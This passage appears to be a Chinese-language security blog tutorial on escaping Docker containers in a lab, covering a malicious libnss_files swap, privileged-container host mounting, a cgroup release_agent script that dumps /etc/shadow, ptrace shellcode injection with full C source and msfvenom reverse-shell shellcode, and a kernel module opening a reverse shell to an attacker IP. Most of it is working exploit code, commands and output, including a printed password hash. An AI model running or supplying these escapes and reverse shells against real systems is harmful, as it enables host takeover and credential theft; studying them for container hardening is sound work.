```

复制breakout到容器并赋予执行权限：

```
shadowflow@ubuntu:~$ sudo docker cp ./breakout victim:/breakout
shadowflow@ubuntu:~$ sudo docker exec -it victim /bin/bash
root@e6885e01f359:/# chmod 777 /breakout
```

将容器内原有的libnss_files.so拷贝到容器根目录并重命名：

```bash
root@e6885e01f359:/# ls -l /lib/x86_64-linux-gnu/ | grep libnss_files
-rw-r--r--  1 root root   51832 Dec 16  2020 libnss_files-2.31.so
lrwxrwxrwx  1 root root      20 Dec 16  2020 libnss_files.so.2 -> libnss_files-2.31.so
root@e6885e01f359:/# cp /lib/x86_64-linux-gnu/libnss_files-2.31.so /original_libnss_files.so.2


#注意：这里也可以从宿主机复制
readlink /lib/x86_64-linux-gnu/libnss_files.so.2 #确定复制的文件
shadowflow@ubuntu:~$ sudo docker cp ~/ngu/glibc-build/nss/libnss_files.so victim:/lib/x86_64-linux-gnu/libnss_files.so.2
```

将恶意文件复制到容器/lib/x86_64-linux-gnu/目录并重名名为libnss_files.so.2:

```bash
shadowflow@ubuntu:~$ sudo docker cp ~/ngu/glibc-build/nss/libnss_files.so victim:/lib/x86_64-linux-gnu/libnss_files.so.2
```

执行docker cp，并查看结果:

```bash
shadowflow@ubuntu:~$ sudo docker cp victim:/etc/passwd ./
shadowflow@ubuntu:~$ sudo docker exec -it /bin/bash
"docker exec" requires at least 2 arguments.
See 'docker exec --help'.

Usage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]

Run a command in a running container
shadowflow@ubuntu:~$ sudo docker exec -it victim /bin/bash
root@82371c2be22f:/# ls host_fs/
bin  boot  cdrom  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swapfile  sys  tmp  usr  var  vmlinuz  vmlinuz.old
root@82371c2be22f:/# 

```

发现已经将宿主机的根目录挂载进来容器的host_fs目录，可以进行逃逸了。



## 4. 通过Capabilities进行逃逸

### 4.1 理解linux Capabilities

Linux内核中的Capabilities特性用于划分特权集，以便进程可以只分配“执行特定功能”的特权。
 在引入此特性前，如果进程需要使用网络，则必须使用root来运行，通常是sudo或者添加suid，那么普通用户在使用ping时，ping就可以运行任何特权。引入Capabilities特性后，可以通过给ping应用添加CAP_NET_RAW特权集，使其具有使用网络的特权集，而不具备其他特权集。缺省ping具有cap_net_admin和cap_net_raw特权集

```bash
➜  ~ getcap /bin/ping
/bin/ping = cap_net_raw+ep
```

在 Linux 中的 Capabilities 是通过 extended attributes 中的 security 命名空间实现的,selinux也是一样

可以通过查看进程/proc/xxxx/status，来检查进程的特权集，并通过capsh来解码得到具体的特权集。

```bash
➜  ~ ps -ef | grep dockerd | grep -v grep
root        466      1  0 02:01 ?        00:00:14 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
➜  ~ cat /proc/466/status | grep Cap
CapInh:	0000000000000000
CapPrm:	0000003fffffffff
CapEff:	0000003fffffffff
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000
```

使用capsh可以翻译出每个BIT的含义，3=0011表示2个bit，f=1111表示4个bit，一共2+4+4+4+4+4+4+4+4+4=38bit，从后先前，每个bit代表一种特权，一共38种特权集.

```bash
➜  ~ capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```



### 4.2 Docker中的Capabilities

Docker 也支持 Capabilities ,在运行容器的时候可以通过指定 --privileded 参数来开启容器的所有CAP，可以通过--cap-add 和 --cap-drop 这两个参数来调整.

- 使用--privileged可以获得所有特权集

  ```bash
  ➜  ~ docker run --name test-privileged -td --privileged  busybox  /bin/httpd -f
  22f11286c7689741930816751d57b69038bcabe1fe2f9a0a62d8c1c58aa1898c
  ➜  ~ ps -ef | grep httpd
  root       4733   4711  0 16:38 pts/0    00:00:00 /bin/httpd -f
  root       4799   4120  0 16:38 pts/0    00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox httpd
  ➜  ~ cat /proc/4733/status | grep -i cap
  CapInh:	0000003fffffffff
  CapPrm:	0000003fffffffff
  CapEff:	0000003fffffffff
  CapBnd:	0000003fffffffff
  CapAmb:	0000000000000000
  ```

- 使用--cap-add=ALL也可以获得所有特权集

  ```bash
  ➜  ~ docker run --name test-all -td --cap-add=ALL busybox /bin/httpd -f
  2a2d0f9fcf2012c59b1493060b42b0d164f448e07d5b9229f7973db081fd289f
  ➜  ~ ps -ef | grep httpd | grep -v grep
  root       5277   5256  0 16:42 pts/0    00:00:00 /bin/httpd -f
  ➜  ~ cat /proc/5277/status | grep -i cap
  CapInh:	0000003fffffffff
  CapPrm:	0000003fffffffff
  CapEff:	0000003fffffffff
  CapBnd:	0000003fffffffff
  CapAmb:	0000000000000000
  ```

- 拥有 SYS_ADMIN 权限

  ```bash
  ➜  ~ docker run --name test -td --cap-add=SYS_ADMIN busybox /bin/httpd -f
  12e311138f8638f602712e3abe9e42cbb4bfc5de39d14803c2c88893b8905bc7
  ➜  ~ ps -ef | grep httpd | grep -v grep
  root       5561   5540  0 16:48 pts/0    00:00:00 /bin/httpd -f
  ➜  ~ cat /proc/5561/status | grep -i cap
  CapInh:	00000000a82425fb
  CapPrm:	00000000a82425fb
  CapEff:	00000000a82425fb
  CapBnd:	00000000a82425fb
  CapAmb:	0000000000000000
  ➜  ~ docker run --name test-privileged -td --privileged  busybox  /bin/httpd -f
  ➜  ~ capsh --decode=00000000a82425fb
  0x00000000a82425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap
  ```



### 4.3 完全特权特权进行逃逸

在特权容器里，你可以把宿主机里的根目录 / 挂载到容器内部，从而去操作宿主机内的任意文件，例如 crontab config file, /root/.ssh/authorized_keys, /root/.bashrc 等文件，而达到逃逸的目的。====

1. 启动一个特权容器环境

   ```
   docker run -it --rm --privileged ubuntu /bin/bash
   ```

   ==使用--cap-add=ALL也可以获得所有特权集，是一样的效果==

2. 判断挂载的磁盘

   ```
   fdisk -l #查看逻辑磁盘看不到切换到/dev目录通过fdisk -l /dev/dm-0判断
   ```

   结果：

   ```bash
   root@bf0b7fcd75d1:/# fdisk -l
   Disk /dev/sda: 41 GiB, 44023414784 bytes, 85983232 sectors
   Disk model: VMware Virtual S
   Units: sectors of 1 * 512 = 512 bytes
   Sector size (logical/physical): 512 bytes / 512 bytes
   I/O size (minimum/optimal): 512 bytes / 512 bytes
   Disklabel type: dos
   Disk identifier: 0x15ec275c
   
   Device     Boot    Start      End  Sectors  Size Id Type
   /dev/sda1  *        2048 83982335 83980288   40G 83 Linux
   /dev/sda2       83984382 85981183  1996802  975M  5 Extended
   /dev/sda5       83984384 85981183  1996800  975M 82 Linux swap / Solaris
   ```

   这里很轻易可以判断出是/dev/sda1

3. 容器内创建挂载的目录

   ```bash
   mkdir /shadowtest
   ```

4. 将宿主机目录挂载到容器内目录

   ```bash
   mount /dev/sda1 /shadowtest
   ```

5. 切换到挂载的宿主机目录

   ```
   chroot /shadowtest
   ```

   结果：

   ```bash
   root@bf0b7fcd75d1:/# chroot /shadowtest
   # cat /etc/passwd | grep shadowflow
   shadowflow:x:1000:1000:shadowflow,,,:/home/shadowflow:/bin/bash
   #
   ```

   

6. 通过反弹shell或者定时任务写入ssh key等方式进行利用

   这里我们反弹shell

   ```bash
   /bin/bash -c "/bin/bash -i >& /dev/tcp/172.16.42.100/4444 0>&1"
   ```

   结果：

   ```bash
   [root@master ~]# nc -lvvp 4444
   Ncat: Version 7.50 ( https://nmap.org/ncat )
   Ncat: Listening on :::4444
   Ncat: Listening on 0.0.0.0:4444
   Ncat: Connection from 172.16.42.151.
   Ncat: Connection from 172.16.42.151:44584.
   root@bf0b7fcd75d1:/#
   ```

   



### 4.4 通过SYS_ADMIN逃逸

```
--cap-add=SYS_ADMIN  启动时，允许执行mount特权操作，需获得资源挂载进行利用。
```

[poc](https://github.com/neargle/cloud_native_security_test_case/blob/master/privileged/1-host-ps.sh): release_agent.sh

修改为`cat /etc/shadow`

```shell
#!/bin/bash

set -uex

mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

sleep 2
cat "/output"
```

只要我们结果中可以看到宿主机的用户表示我们成功逃逸

**漏洞利用成功有如下前提：**

```
在容器内root用户
容器必须使用SYS_ADMIN Linux capability运行
容器必须缺少AppArmor配置文件，否则将允许mount syscall
cgroup v1虚拟文件系统必须以读写方式安装在容器内部
```

启动漏洞环境：

```bash
docker run --name test -itd --cap-add=SYS_ADMIN --security-opt apparmor=unconfined --rm debian /bin/bash
```

将poc导入到容器：

```bash
docker cp release_agent.sh test:/root/
```

进入容器执行：

```
docker exec -it test /bin/bash
```

```bash
root@826a9c2d8457:/# bash /root/release_agent.sh
......
hplip:*:18848:0:99999:7:::
shadowflow:$6$oAwaNvbnhpdcJooQ$Ng3O0KGA9/TZghLbmPXGWBS1UDaPH9fqgxAhemNwmq9GA2rnfeJNQ68wrf2XcNQBWC3QEhHNz.e9WrzjOst6d0:18848:0:99999:7:::
systemd-coredump:!!:18848::::::
```



### 4.5 通过SYS_PTRACE逃逸

攻击机器：172.16.42.100

靶机：172.16.42.151

带有SYS_PTRACE权限的容器还是挺多的，对于开发来说可能需要SYS_PTRACE权限进行调试

靶机启动带宿主机进程和CAP_SYS_PTRACE特权的容器

```
docker run --name test -itd --cap-add=SYS_PTRACE --pid=host --security-opt apparmor=unconfined --rm ubuntu
```

**利用成功前提：**

```
--cap-add=SYS_PTRACE
--pid=host
--security-opt apparmor=unconfined
```



获取poc：https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c

生成shellcode(如果不生成，会在靶机上生成一个终端):

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.16.42.100 LPORT=4444 -f c
```

替换shellcode(==注意长度#define SHELLCODE_SIZE 74，等于shellcode的大小，一定要设置为相应大小的值==）:

```c
/*
  Mem Inject
  Copyright (c) 2016 picoFlamingo
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 74

unsigned char *shellcode = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\xac\x10\x2a\x64\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"; 


int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);

  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }

  printf ("+ Waiting for process...\n");
  wait (NULL);

  printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  

  /* Inject code into current RPI position */

  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);

  regs.rip += 2;
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);

  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");

 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
  return 0;

}


```

编译代码:

```
gcc infect.c -o infect
```

移动到容器：

```
docker cp infect test:/root/
```

攻击机监听

```
nc -lvvp 4444
```

靶机宿主机启动一个python server进程

```
python -m SimpleHTTPServer 55555
```

查看python server进程:7365

 ```bash
➜  poc docker cp infect test:/root/
➜  poc docker exec -it test /bin/bash
root@f147ae171646:/# ps -ef | grep 5555
root      15260   7462  0 11:44 ?        00:00:00 python3 -m http.server 55555
root      15262  15233  0 11:45 pts/1    00:00:00 grep --color=auto 5555
root@f147ae171646:/# /root/infect 15260
+ Tracing process 15260
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x7fdb32ef77e4
+ Setting instruction pointer to 0x7fdb32ef77e6
+ Run it!
root@f147ae171646:/#
 ```

 结果：

```bash
[root@master ~]# nc -lvvp 4444
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.16.42.151.
Ncat: Connection from 172.16.42.151:37440.
ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.42.151  netmask 255.255.255.0  broadcast 172.16.42.255
        inet6 fe80::20c:29ff:fe01:f943  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:01:f9:43  txqueuelen 1000  (Ethernet)
        RX packets 206535  bytes 221632693 (211.3 MiB)

```



### 4.6 通过SYS_MODULE逃逸



exp.c

```c
#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/init.h> /* Needed for the macros */
#include <linux/sched/signal.h>
#include <linux/nsproxy.h>
#include <linux/proc_ns.h>
///< The license type -- this affects runtime behavior
MODULE_LICENSE("GPL");
///< The author -- visible when you use modinfo
MODULE_AUTHOR("Nimrod Stoler");
///< The description -- see modinfo
MODULE_DESCRIPTION("NS Escape LKM");
///< The version of the module
MODULE_VERSION("0.1");
static int __init escape_start(void)
{
    int rc;
    static char *envp[] = {
        "SHELL=/bin/bash",
        "HOME=/home/cyberark",
        "USER=cyberark",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin",
        "DISPLAY=:0",
        NULL
    };
    char *argv[] = {"/bin/bash","-c", "bash -i >& /dev/tcp/172.16.42.100/4444 0>&1", NULL};
    rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    printk("RC is: %i \n", rc);
    return 0;
}


static void __exit escape_end(void)
{
    printk(KERN_EMERG "Goodbye!\n");
}
module_init(escape_start);
module_exit(escape_end);
```

Makefile:

```makefile
ifneq ($(KERNELRELEASE),)
    obj-m :=exp.o
else
    KDIR :=/lib/modules/$(shell uname -r)/build
all:
	make -C $(KDIR) M=$(PWD) modules
clean:
	rm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order
endif
```

编译：

```bash
➜  make
make -C /lib/modules/4.19.0-18-amd64/build M=/root/poc/moudle modules
make[1]: 进入目录“/usr/src/linux-headers-4.19.0-18-amd64”
  CC [M]  /root/poc/moudle/exp.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /root/poc/moudle/exp.mod.o
  LD [M]  /root/poc/moudle/exp.ko
make[1]: 离开目录“/usr/src/linux-headers-4.19.0-18-amd64”
```

编译完成后有如下文件

```bash
➜ ls
exp.c  exp.ko  exp.mod.c  exp.mod.o  exp.o  Makefile  modules.order  Module.symvers
```

在攻击机启动监听

```bash
nc -lvvp 4444
```

启动sysmodule环境的容器(这里用busybox，因为要用insmod)

```bash
docker run --name test -itd --cap-add=SYS_MODULE --rm busybox
```

将exp.ko复制到容器

```bash
docker cp exp.ko test:/root/
```

进入容器

```bash
docker exec -it test /bin/sh
```

执行攻击

```bash
insmod exp.ko
```

结果：

```bash
[root@master ~]# nc -lvvp 4444
Ncat: Version 7.50 ( https://n
map.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.16.42.151.
Ncat: Connection from 172.16.42.151:56732.
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@vuln:/#
```

测试完成后删除模块

```
rmmod exp.ko
```





## 5. 通过内核漏洞进行逃逸

### 5.1 脏牛提权

漏洞编号：CVE-2016-5195
漏洞名称：脏牛（Dirty COW）
漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权
影响范围：Linux内核>=2.6.22

该漏洞是 Linux 内核的内存子系统在处理写时拷贝（Copy-on-Write）时存在条件竞争漏洞， 导致可以破坏私有只读内存映射。黑客可以在获取低权限的的本地用户后，利用此漏洞获取 其他只读内存映射的写权限，进一步获取 root 权限。

脏牛提权跟CVE-2018-15664有异曲同工之妙

这里需要重新搭建低版本虚拟机环境就不再复现。



## 6. 总结

本文先讨论了关于容器逃逸相关的一些信息收集手法，然后讨论了挂载敏感目录逃逸的方法，在挂载目录逃逸中又讨论了两种特殊的情况：Docker in Docker和procfs。之后我们我们讨论了利用容器运行时的runC漏洞进行逃逸，再之后我们通过容器的Capabilities权限进行逃逸，其中--privileged参数具有所有的docker Capabilities权限，可以很方便的逃逸，然后分别讨论了在有限Capabilities权限下逃逸的手法，分别对应的特权是：SYS_ADMIN、SYS_PTRACE、SYS_MODULE。最后是内核提权。





## 7. 参考

- https://security.tencent.com/index.php/blog/msg/183

- 《云原生攻防实践与体系建设》
- https://mp.weixin.qq.com/s/WaRECg79Nxx08iekakrlMA
- https://segmentfault.com/a/1190000017543294
- https://www.jianshu.com/p/7afb69668280
- https://threezh1.com/2021/02/26/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8Cheat_Sheet/#CVE-2019-5736-runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E

